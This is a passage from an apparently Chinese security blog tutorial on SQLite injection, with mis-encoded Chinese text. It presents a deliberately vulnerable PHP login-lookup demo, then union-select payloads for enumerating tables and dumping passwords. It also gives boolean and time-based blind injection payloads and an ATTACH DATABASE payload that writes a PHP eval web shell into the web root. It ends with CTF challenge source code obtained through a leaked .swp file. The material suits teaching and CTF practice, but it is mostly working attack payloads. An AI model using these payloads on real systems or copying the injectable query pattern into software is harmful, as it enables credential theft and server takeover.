        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>80<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>

<span class="token delimiter">&lt;?php</span>
   <span class="token keyword">class</span> <span class="token class-name">MyDB</span> <span class="token keyword">extends</span> <span class="token class-name">SQLite3</span>
   <span class="token punctuation">{</span>
      <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'user.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
   <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">lastErrorMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token string">"Opened database successfully\n&lt;/br>"</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>

   <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$sql</span> <span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
      <span class="token constant">SELECT</span> <span class="token operator">*</span> from user_data where id<span class="token operator">=</span><span class="token string">'$id'</span><span class="token punctuation">;</span>
<span class="token constant">EOF</span><span class="token punctuation">;</span>
    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token operator">==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"Error in fetch "</span><span class="token punctuation">.</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">lastErrorMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$ret</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token constant">SQLITE3_ASSOC</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"ID = "</span><span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"NAME = "</span><span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"PASS = "</span><span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token constant">SQLITE3_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>   

   <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span></code></pre>
<h3 id="union-select-æ³¨å…¥å’Œä¸€äº›æŸ¥è¯¢payload"><a href="#union-select-æ³¨å…¥å’Œä¸€äº›æŸ¥è¯¢payload" class="headerlink" title="union select æ³¨å…¥å’Œä¸€äº›æŸ¥è¯¢payload"></a>union select æ³¨å…¥å’Œä¸€äº›æŸ¥è¯¢payload</h3><p>ä»¥ä¸Šdemoæ­£å¸¸çš„åŠŸèƒ½æ˜¯è¾“å…¥idæŸ¥è¯¢æ•°æ®åº“ä¸­æ•°æ®.</p>
<p>æµ‹è¯•ï¼š<br>æ­£å¸¸è¾“å…¥æŸ¥è¯¢<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038582199318.jpg" alt=""></p>
<p>å°è¯•é—­åˆå•å¼•å·ï¼š<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038764678706.jpg" alt=""></p>
<p>é—­åˆè¯­å¥<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038582992371.jpg" alt=""></p>
<p>ä½¿ç”¨order byç¡®å®šæŸ¥è¯¢å­—æ®µæ•°ï¼š</p>
<pre><code>1&#39; order by 3;
1&#39; order by 4;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038583809395.jpg" alt=""></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038764935323.jpg" alt=""></p>
<pre><code>0&#39; union select 1,2,3;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038765322328.jpg" alt=""></p>
<h4 id="æŸ¥ç‰ˆæœ¬"><a href="#æŸ¥ç‰ˆæœ¬" class="headerlink" title="æŸ¥ç‰ˆæœ¬"></a>æŸ¥ç‰ˆæœ¬</h4><p>æŸ¥ç‰ˆæœ¬ã€‚</p>
<pre><code>0&#39; union select 1,2,sqlite_version();</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038769569244.jpg" alt=""></p>
<h4 id="è¡¨åå’Œåˆ—å"><a href="#è¡¨åå’Œåˆ—å" class="headerlink" title="è¡¨åå’Œåˆ—å"></a>è¡¨åå’Œåˆ—å</h4><p>æŸ¥è¡¨åå’Œå­—æ®µã€‚</p>
<pre><code>0&#39; union select 1,2,sql from sqlite_master;
or
0&#39; union select 1,2,sql from sqlite_master where type=&#39;table&#39;;
or
0&#39; union select 1,2,sql from sqlite_master where type=&#39;table&#39; and name=&#39;user_data&#39;;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038770854698.jpg" alt=""></p>
<p>æˆ–è€…ï¼š<br>å¤šæ¡è®°å½•æ—¶å¯ä»¥ä½¿ç”¨group_concatèšåˆæˆ–è€…ä½¿ç”¨limit</p>
<pre><code>0&#39; union select 1,2,group_concat(tbl_name) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; --
æˆ–è€…ä½¿ç”¨limitæ¥è¾“å‡ºä¸€è¡Œç»“æœ
0&#39; union select 1,2,tbl_name FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 2 offset 1 --</code></pre><p>limitåé¢æ¥çš„æ•°å­—æ˜¯æˆªå–çš„è¡Œæ•°ï¼Œè€Œoffeståé¢æ¥çš„æ•°å­—åˆ™ä¸ºç¬¬ä¸€æ¬¡è¿”å›ç»“æœä¸­çš„åˆ é™¤æ•°ã€‚åœ¨ä¸Šè¿°æŸ¥è¯¢ä¸­ï¼Œlimitæå–äº†ä¸¤ä¸ªè¡¨åï¼Œç„¶åç¬¬ä¸€ä¸ªè¢«offsetåˆ é™¤æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è·å¾—äº†ç¬¬äºŒä¸ªè¡¨åã€‚</p>
<p>å¦å¤–å¯ä»¥é€šè¿‡ä¸‹é¢çš„payloadè·å–åˆ°æ ¼å¼åŒ–è¿‡çš„åˆ—åï¼š</p>
<pre><code>0&#39; union select 1,2,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,&#39;(&#39;)+1)),instr((substr(sql,instr(sql,&#39;(&#39;)+1)),&#39;`&#39;)),&quot;TEXT&quot;,&#39;&#39;),&quot;INTEGER&quot;,&#39;&#39;),&quot;AUTOINCREMENT&quot;,&#39;&#39;),&quot;PRIMARY KEY&quot;,&#39;&#39;),&quot;UNIQUE&quot;,&#39;&#39;),&quot;NUMERIC&quot;,&#39;&#39;),&quot;REAL&quot;,&#39;&#39;),&quot;BLOB&quot;,&#39;&#39;),&quot;NOT NULL&quot;,&#39;&#39;),&quot;,&quot;,&#39;~~&#39;) from sqlite_master where type=&#39;table&#39; and name=&#39;user_data&#39; --</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16074041125183.jpg" alt=""></p>
<h4 id="æŸ¥æ•°æ®"><a href="#æŸ¥æ•°æ®" class="headerlink" title="æŸ¥æ•°æ®"></a>æŸ¥æ•°æ®</h4><p>æŸ¥æ•°æ®</p>
<pre><code>0&#39; union select id,name,passwd from user_data;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038772817163.jpg" alt=""></p>
<p>ä½¿ç”¨group_concatè¿æ¥æŸ¥è¯¢ç»“æœ</p>
<pre><code>0&#39; union select 1,2,group_concat(passwd) from user_data;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038781525366.jpg" alt=""></p>
<p>å½“ç„¶ï¼Œhexï¼Œlimitï¼Œsubstrç­‰ä¹Ÿéƒ½å¯ä»¥åœ¨æ³¨å…¥ä¸­ç”¨æ¥æ„é€ è¯­å¥ã€‚</p>
<h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>å’Œå…¶ä»–æ³¨å…¥å·®ä¸å¤šï¼Œåˆ—ä¸¾å‡ ä¸ªæ³¨å…¥payloadï¼š</p>
<h4 id="Bool"><a href="#Bool" class="headerlink" title="Bool"></a>Bool</h4><p><strong>bool</strong></p>
<blockquote>
<p>æ²¡æœ‰midã€leftç­‰å‡½æ•°</p>
</blockquote>
<pre><code>select * from test where id =1 union select 1,length(sqlite_version())=6

sqlite&gt; select * from test union select 1,length(sqlite_version())=6;
id          name
----------  ----------
1           1
1           alice
2           bob
Run Time: real 0.003 user 0.000115 sys 0.002050
sqlite&gt; select * from test union select 1,length(sqlite_version())=5;
id          name
----------  ----------
1           0
1           alice
2           bob
Run Time: real 0.001 user 0.000133 sys 0.000126</code></pre><pre><code>select * from test where id=1 and length(sqlite_version())=5;

sqlite&gt; select * from test where id=1 and length(sqlite_version())=5;
Run Time: real 0.001 user 0.000065 sys 0.000493
sqlite&gt; select * from test where id=1 and length(sqlite_version())=6;
id          name
----------  ----------
1           alice
Run Time: real 0.001 user 0.000079 sys 0.000115</code></pre><pre><code>select * from test where id=1 and substr(sqlite_version(),1,1)=&#39;3&#39;;

sqlite&gt; select * from test where id=1 and substr(sqlite_version(),1,1)=&#39;3&#39;;
id          name
----------  ----------
1           alice
Run Time: real 0.000 user 0.000067 sys 0.000039
sqlite&gt; select * from test where id=1 and substr(sqlite_version(),1,1)=&#39;2&#39;;
Run Time: real 0.000 user 0.000054 sys 0.000031</code></pre><h4 id="Sleep"><a href="#Sleep" class="headerlink" title="Sleep"></a>Sleep</h4><p><strong>sleep</strong></p>
<p>sqliteæ²¡æœ‰sleep()å‡½æ•°ï¼Œä½†æ˜¯æœ‰ä¸ªå‡½æ•°randomblob(N)ï¼Œä½œç”¨æ˜¯è¿”å›ä¸€ä¸ª N å­—èŠ‚é•¿çš„åŒ…å«ä¼ªéšæœºå­—èŠ‚çš„ BLOGã€‚ N æ˜¯æ­£æ•´æ•°ã€‚å¯ä»¥ç”¨å®ƒæ¥åˆ¶é€ å»¶æ—¶ã€‚</p>
<p>è€Œä¸”sqliteæ²¡æœ‰ifå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨caseæ¥æ„é€ æ¡ä»¶</p>
<pre><code>select * from test where id=1 and 1=(case when(substr(sqlite_version(),1,1)=&#39;3&#39;) then randomblob(1000000000) else 0 end);

sqlite&gt; select * from test where id=1 and 1=(case when(substr(sqlite_version(),1,1)=&#39;3&#39;) then randomblob(1000000000) else 0 end);
Run Time: real 6.195 user 5.804650 sys 0.329666</code></pre><h2 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h2><p>å†™shellä¾é sqliteçš„åˆ›å»ºæ•°æ®åº“åŠŸèƒ½ã€‚</p>
<p>é™¤äº†å‰é¢æåˆ°çš„ <code>sqlite3 test.db</code> è¿™ç§æ–¹æ³•è¿˜å¯ä»¥é€šè¿‡ <code>ATTACH DATABASE</code> è¿™ç§æ–¹æ³•æ¥å®ç°ã€‚</p>
<p><strong>ATTACH</strong></p>
<blockquote>
<p>å‡è®¾è¿™æ ·ä¸€ç§æƒ…å†µï¼Œå½“åœ¨åŒä¸€æ—¶é—´æœ‰å¤šä¸ªæ•°æ®åº“å¯ç”¨ï¼Œæ‚¨æƒ³ä½¿ç”¨å…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªã€‚SQLite çš„ ATTACH DATABASE è¯­å¥æ˜¯ç”¨æ¥é€‰æ‹©ä¸€ä¸ªç‰¹å®šçš„æ•°æ®åº“ï¼Œä½¿ç”¨è¯¥å‘½ä»¤åï¼Œæ‰€æœ‰çš„ SQLite è¯­å¥å°†åœ¨é™„åŠ çš„æ•°æ®åº“ä¸‹æ‰§è¡Œã€‚</p>
</blockquote>
<p>é™„åŠ ï¼š</p>
<pre class=" language-sql"><code class="language-sql">attach <span class="token punctuation">[</span><span class="token keyword">database</span><span class="token punctuation">]</span> filename <span class="token keyword">as</span> database_name<span class="token punctuation">;</span></code></pre>
<p>å–æ¶ˆï¼š</p>
<pre class=" language-sql"><code class="language-sql">attach <span class="token punctuation">[</span><span class="token keyword">database</span><span class="token punctuation">]</span> filename <span class="token keyword">as</span> database_name<span class="token punctuation">;</span></code></pre>
<p>å¦‚æœç›®æ ‡æ•°æ®åº“å­˜åœ¨ï¼Œåˆ™ä¼šç›´æ¥ä½¿ç”¨è¯¥æ•°æ®åº“è¿›è¡Œé™„åŠ ï¼ŒæŠŠæ•°æ®åº“æ–‡ä»¶åç§°ä¸é€»è¾‘æ•°æ®åº“ â€˜database_nameâ€™ ç»‘å®šåœ¨ä¸€èµ·ã€‚å¦‚æœç›®æ ‡ä¸å­˜åœ¨ï¼Œåˆ™ä¼šå…ˆåˆ›å»ºè¯¥æ•°æ®åº“ï¼Œå¦‚æœæ•°æ®åº“æ–‡ä»¶è·¯å¾„è®¾ç½®åœ¨webç›®å½•ä¸‹ï¼Œå°±å¯ä»¥å®ç°å†™shellçš„åŠŸèƒ½ã€‚</p>
<p>è¦å®ç°å†™shellï¼Œéœ€è¦å¦‚ä¸‹æ“ä½œï¼š</p>
<p>é€šè¿‡ attach åœ¨ç›®æ ‡ç›®å½•æ–°å»ºä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶  =&gt;  åœ¨æ–°æ•°æ®åº“åˆ›å»ºè¡¨ã€‚=&gt;  åœ¨è¡¨ä¸­æ’å…¥payload</p>
<p>åœ¨sqlite shellä¸­å®ç°å¦‚ä¸‹ï¼š</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16073561510628.jpg" alt=""></p>
<p>ä½†æ˜¯åœ¨æˆ‘çš„ demo ä¸­æµ‹è¯•æ—¶å‘ç°ï¼Œå¹¶æ²¡æœ‰åˆ›å»ºå¯¹åº”çš„æ–‡ä»¶ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰æˆåŠŸæ‰§è¡Œattachå’Œåé¢çš„ä»£ç ã€‚å†å»çœ‹äº†ä¸‹å‰é¢çš„demoä»£ç ï¼Œå‘ç°æŸ¥è¯¢æ“ä½œä½¿ç”¨çš„æ˜¯ query æ–¹æ³•ï¼Œåœ¨ä½¿ç”¨ exec æ–¹æ³•çš„æ—¶å€™å°±å¯ä»¥æ­£å¸¸åˆ©ç”¨äº†ã€‚</p>
<p>payloadï¼š</p>
<pre><code>&#39;;ATTACH DATABASE &#39;/var/www/html/sqlite_test/shell.php&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#39;); --</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16074030982818.jpg" alt=""></p>
<h2 id="ä¸€é“é¢˜ç›®"><a href="#ä¸€é“é¢˜ç›®" class="headerlink" title="ä¸€é“é¢˜ç›®"></a>ä¸€é“é¢˜ç›®</h2><p>é¢˜ç›®å«åšSQLManagerï¼Œé¡µé¢ç®€å•å®ç°äº†sqliteæ•°æ®åº“çš„ç®¡ç†ï¼Œå®ç°çš„åŠŸèƒ½åªæœ‰tableçš„åˆ›å»ºï¼Œå±•ç¤ºï¼Œrecordçš„æ’å…¥ã€‚</p>
<p>å­˜åœ¨æºç æ³„æ¼ï¼š</p>
<pre><code>view-source:http://eci-2zeiqyu2obvakg4ee0sx.cloudeci1.ichunqiu.com/.index.php.swp</code></pre><p>æ‹¿åˆ°æºç å¦‚ä¸‹ï¼š</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'util.php'</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$method</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'GET'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token string">'build'</span><span class="token punctuation">,</span> <span class="token string">'modify'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flash'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'modify'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">"Please build database first."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:db/'</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT name FROM sqlite_master WHERE type='table' AND name &lt;> '"</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">"' LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$tName</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"PRAGMA table_info(`{$tName}`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$cName</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'modify'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$values</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'values'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `{$tName}` VALUES (?"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">',?'</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cName</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'build'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'table_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'columns'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'Parameters missing.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$tName</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'table_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$ccc</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'columns'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.db'</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:db/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'è¡¨ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
